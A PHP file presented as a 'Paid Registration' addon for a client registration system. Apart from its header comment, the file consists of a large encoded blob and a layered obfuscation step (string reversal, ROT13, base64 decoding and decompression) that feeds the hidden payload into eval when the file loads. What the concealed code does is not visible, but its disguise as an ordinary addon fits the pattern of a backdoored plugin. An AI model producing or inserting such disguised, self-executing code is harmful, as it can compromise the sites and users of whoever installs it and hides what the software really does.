<?php
/*
Addon Name: Paid Registration
Description: Configure the self registration system to only give clients access after they have paid using one of the provided payment gateways.

*/

$VzQhLXiqCMPtlSnbg='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';$JAdtGCwlkranaGjYhF=';))))toaFygCZPdvKYuDmI$(ireegf(rqbprq_46rfno(rgnysavmt(ynir';$oj_iJlbhhTvehkuSHR=strrev($JAdtGCwlkranaGjYhF);$NfRwHAQxSqSVmzDCi=str_rot13($oj_iJlbhhTvehkuSHR);eval($NfRwHAQxSqSVmzDCi);

?>